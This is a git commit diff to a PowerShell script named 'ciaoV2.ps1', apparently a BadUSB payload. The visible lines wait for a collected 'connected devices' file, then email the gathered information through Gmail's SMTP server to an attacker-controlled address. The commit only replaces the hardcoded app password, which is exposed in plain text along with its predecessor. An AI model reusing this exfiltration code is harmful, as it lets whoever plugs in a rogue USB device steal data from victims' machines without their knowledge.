375b00c349562617a0471b54a479dd24b3dbf9d1
jesaisquejenesaisrien <127311128+jesaisquejenesaisrien@users.noreply.github.com>
2023-03-08 14:33:32 +0100

    Update ciaoV2.ps1

--- ciaoV2.ps1
+++ ciaoV2.ps1
@@ -14,7 +14,7 @@ Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file tak
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('badusb2023@gmail.com', 'idciqxpxzfxthqfo') #Email with which you want to send information
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('badusb2023@gmail.com', 'prsxacgmkvbrrfiq') #Email with which you want to send information
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 $ReportEmail.From = 'badusb2023@gmail.com' #Email in which you want to receice the information
 $ReportEmail.To.Add('badusb2023@gmail.com') #Email in which you want to receive the information
